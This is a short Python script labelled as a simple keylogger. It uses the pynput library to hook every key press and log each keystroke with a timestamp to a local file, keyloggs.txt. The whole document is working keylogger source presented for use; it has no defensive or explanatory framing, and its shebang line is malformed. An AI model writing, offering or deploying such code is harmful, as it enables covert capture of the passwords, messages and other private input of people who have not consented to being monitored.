#!/usr/bin/env/python
#Simple Python keylogger

from pynput.keyboard import Key, Listener
import logging

logs = ""

logging.basicConfig(filename=(logs + "keyloggs.txt"), \
     level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()